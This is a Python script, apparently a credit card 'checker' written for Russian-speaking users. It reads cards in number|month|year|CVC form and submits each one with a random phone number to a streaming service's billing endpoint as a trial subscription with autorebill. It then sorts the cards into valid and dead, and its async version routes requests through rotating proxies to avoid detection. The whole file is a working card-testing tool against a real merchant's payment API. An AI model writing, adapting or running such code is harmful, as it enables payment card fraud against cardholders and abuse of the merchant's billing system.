from requests import post, get
from random import choice
import aiohttp
def get_random_proxy():
	with open("proxies.txt","r") as file:
		cont = file.read().split("\n")
		return choice(cont)
def lget(l, idx, default):
	try:
		return l[idx]
	except IndexError:
		return default
def check_legacy(cc):
	try:
		phone = "79" + "".join(choice("0123456789") for i in range(9))
		card = lget(cc.split("|"), 0, None)
		mm = lget(cc.split("|"), 1, None) 
		yy = lget(cc.split("|"), 2, None)
		cvc = lget(cc.split("|"), 3, None)
		req = get(
        f"https://api.kino.1tv.ru/1.4/checkCard?msisdn={phone}&client=web").text
		result = post("https://payment.kino.1tv.ru/billing/subsUnitellerDirect", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 11; POCO M3 / Redmi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",},data={"msisdn": phone, "pan": card, "cardholder": "MEGOGO", "exp_year": '20'+ yy, "exp_month": mm, "cvv": cvc, "client": "web", "send_receipt": False, "type": "trial_7", "autorebill": True, "channel": "subs_page",  "mobile": True, "flow[from]": "subs", "flow[from_block]": "subs_sidebar_block", "flow[from_position]": "0",},).json()
		if "card_exist" in result or "access_token" in result:
			return f"💎VALID: {cc}"
		elif result['error']['message'] == 'Ошибка при оплате. Проверьте баланс карты и повторите попытку еще раз.':
			return f"⛔DEAD: {cc}"
		else:
			print(result)
			return "Произошла ошибка при чеке карты"
	except TypeError:
		return "Ошибка. Деньги списаны - вводите карты в правильном формате."
async def check(cc):
	try:
		url = get_random_proxy()
		phone = "79" + "".join(choice("0123456789") for i in range(9))
		card = lget(cc.split("|"), 0, None)
		mm = lget(cc.split("|"), 1, None) 
		yy = lget(cc.split("|"), 2, None)
		cvc = lget(cc.split("|"), 3, None)
		async with aiohttp.ClientSession() as session:
			async with session.get(f"https://api.kino.1tv.ru/1.4/checkCard?msisdn={phone}&client=web", proxy=url) as req:
				s = req.text
			async with session.post("https://payment.kino.1tv.ru/billing/subsUnitellerDirect", proxy=url, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 11; POCO M3 / Redmi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",}, data={"msisdn": phone, "pan": card, "cardholder": "MEGOGO", "exp_year": '20'+ yy, "exp_month": mm, "cvv": cvc, "client": "web", "send_receipt": False, "type": "trial_7", "autorebill": True, "channel": "subs_page",  "mobile": True, "flow[from]": "subs", "flow[from_block]": "subs_sidebar_block", "flow[from_position]": "0",}) as result:
				rjson = await result.json()
		if "card_exist" in rjson or "access_token" in rjson:
			return f"💎VALID: {cc}"
		elif rjson['error']['message'] == 'Ошибка при оплате. Проверьте баланс карты и повторите попытку еще раз.':
			return f"⛔DEAD: {cc}"
		else:
			print(rjson)
			return "Произошла ошибка при чеке карты"
	except TypeError:
		return "Ошибка. Деньги списаны - вводите карты в правильном формате."
	except aiohttp.client_exceptions.ClientProxyConnectionError:
		return "Какая-то хуйня с прокси."